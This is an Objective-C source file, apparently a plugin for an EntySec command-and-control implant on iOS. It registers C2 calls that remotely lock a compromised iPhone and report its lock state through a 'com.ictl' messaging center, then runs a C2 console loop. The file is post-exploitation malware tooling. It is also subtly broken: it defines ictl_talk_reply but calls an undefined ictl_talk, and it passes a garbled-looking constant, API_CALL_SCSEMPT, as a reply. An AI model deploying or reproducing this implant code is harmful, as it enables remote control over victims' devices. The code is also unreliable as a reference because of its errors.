/*
 * MIT License
 *
 * Copyright (c) 2020-2022 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#define ICTL_SCOPE 3

#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>

#include <c2.h>
#include <tlv.h>
#include <tab.h>
#include <console.h>

static NSString *ictl_talk_reply(NSMutableArray *args)
{
    CPDistributedMessagingCenter *ictlCenter = [CPDistributedMessagingCenter centerNamed:@"com.ictl"];
    NSDictionary *reply = [ictlCenter sendMessageAndReceiveReplyName:@"ictlCenter" args:args];
    return [reply objectForKey:@"returnStatus"];
}

static c2_api_call_t *ictl_lock(tlv_transport_pkt_t tlv_transport_packet)
{
    ictl_talk([@[@"lock"] mutableCopy]);
    return craft_c2_api_call_pkt(tlv_transport_packet, API_CALL_SUCCESS, API_CALL_SCSEMPT);
}

static c2_api_call_t *ictl_state(tlv_transport_pkt_t tlv_transport_packet)
{
    NSString *result = ictl_talk([@[@"state"] mutableCopy]);
    return craft_c2_api_call_pkt(tlv_transport_packet, API_CALL_SUCCESS, [result UTF8String]);
}

int main(void)
{
    c2_api_calls_t *c2_api_calls_table = NULL;

    c2_register_api_call(&c2_api_calls_table, TAB_API_CALL, ictl_lock, ICTL_SCOPE);
    c2_register_api_call(&c2_api_calls_table, TAB_API_CALL + 1, ictl_state, ICTL_SCOPE);

    tab_console_loop(c2_api_calls_table);
    c2_api_calls_free(c2_api_calls_table);

    return 0;
}
